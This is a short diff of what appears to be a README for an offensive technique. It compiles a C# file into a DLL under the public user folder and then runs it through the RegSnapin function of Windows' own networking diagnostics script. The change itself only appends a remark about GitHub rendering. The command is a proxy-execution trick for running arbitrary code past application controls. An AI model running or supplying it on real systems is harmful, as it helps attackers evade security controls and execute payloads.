@@ -7,7 +7,7 @@ csc.exe /out:"c:\users\public\combined.dll" "c:\users\public\program.cs"
 
 To run:
 
-powershell.exe -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin ..\..\..\..\users\public\combined.dll;[Program.Stage0]::Main()"
+powershell.exe -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin ..\..\..\..\users\public\combined.dll;[Program.Stage0]::Main()" (click to display the source blob because GitHub is not rendering this line correctly...will try to fix)
 
 
 **NOTES**
